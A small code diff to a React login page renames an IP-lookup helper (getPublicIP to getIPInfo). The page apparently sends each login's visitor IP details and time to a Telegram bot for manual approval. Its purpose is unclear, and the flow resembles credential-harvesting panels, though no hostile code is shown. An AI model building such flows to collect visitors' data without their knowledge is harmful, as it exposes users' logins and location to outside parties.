@@ -5,7 +5,7 @@ import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { getPublicIP, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
+import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -40,7 +40,7 @@ export default function Login() {
     if (!result.ok) { setError(t.invalidCredentials); return; }
 
     const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const [ip, startOffset] = await Promise.all([getPublicIP(), getLatestOffset()]);
+    const [ip, startOffset] = await Promise.all([getIPInfo(), getLatestOffset()]);
     const sessionKey = Date.now().toString(36);
     offsetRef.current = startOffset;
 
